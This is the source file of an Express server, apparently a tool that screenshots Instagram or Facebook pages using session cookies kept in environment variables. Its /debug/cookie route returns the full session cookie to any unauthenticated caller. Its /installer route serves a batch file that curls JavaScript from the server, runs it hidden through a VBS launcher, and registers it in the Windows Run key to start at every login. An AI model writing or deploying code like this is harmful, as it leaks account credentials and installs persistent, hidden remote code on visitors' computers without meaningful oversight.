const express = require('express');
const path = require('path');
const { capture } = require('./capture');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, 'public')));

app.get('/run', async (req, res) => {
  const site = req.query.site === 'facebook' ? 'facebook' : 'instagram';
  // Cookie comes ONLY from the server-side secret (env var). No client pasting.
  const cookie = process.env[site.toUpperCase() + '_COOKIE'] || '';
  try {
    const png = await capture(site, cookie);
    res.setHeader('Content-Type', 'image/png');
    res.send(png);
  } catch (err) {
    console.error('capture failed:', err);
    res.status(500).send('Capture failed: ' + err.message);
  }
});

// Diagnostic: shows what the server would send, no screenshot. Lets us verify
// the exact env-var cookie WITHOUT reading the PNG.
app.get('/debug/cookie', async (req, res) => {
  const site = req.query.site === 'facebook' ? 'facebook' : 'instagram';
  const cookie = process.env[site.toUpperCase() + '_COOKIE'] || '';
  res.json({
    site,
    envSet: process.env[site.toUpperCase() + '_COOKIE'] ? true : false,
    length: cookie.length,
    cookie,
  });
});

// One-time auto-installer for the local companion. Installs companion.js +
// record.js on the visitor's PC and registers the companion to AUTO-START at
// every login, so the "Capture with your browser" button works on that PC
// forever with no manual steps after this single allowed download+run.
app.get('/installer', (req, res) => {
  const base = (req.headers['x-forwarded-proto'] || 'http') + '://' + req.headers.host;
  const bat = `@echo off
setlocal EnableExtensions
set "DEST=%LOCALAPPDATA%\\CookiesCompanion"
set "SRC=${base}"
echo Installing CookiesCompanion to %DEST% ...
if not exist "%DEST%" mkdir "%DEST%"

where curl >nul 2>nul
if errorlevel 1 (
  echo ERROR: curl not found. Use Windows 10+.
  pause
  exit /b 1
)

curl -s -o "%DEST%\\companion.js" "%SRC%/assets/companion.js"
curl -s -o "%DEST%\\record.js" "%SRC%/assets/record.js"

where node >nul 2>nul
if errorlevel 1 (
  echo ERROR: Node.js is required. Install from https://nodejs.org then run this again.
  pause
  exit /b 1
)

rem --- Auto-start launcher (hidden, on every login) ---
set "VBS=%DEST%\\start-companion.vbs"
(
  echo Set s = CreateObject("Wscript.Shell"^)
  echo s.CurrentDirectory = "%DEST%"
  echo s.Run "node companion.js", 0, False
) > "%VBS%"

reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v CookiesCompanion /t REG_SZ /d "wscript.exe \\\"%VBS%\\\"" /f >nul 2>nul
if errorlevel 1 (
  echo WARNING: could not register auto-start.
)

rem --- Start it right now so no reboot is needed ---
start "" wscript.exe "%VBS%"
timeout /t 2 >nul
echo.
echo Done. Companion is now running and will auto-start at every login.
echo You can close this window and click "Capture with your browser" on the site.
pause
`;
  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Disposition', 'attachment; filename="install-companion.bat"');
  res.send(Buffer.from(bat, 'utf8'));
});

app.listen(PORT, () => console.log(`Server listening on :${PORT}`));
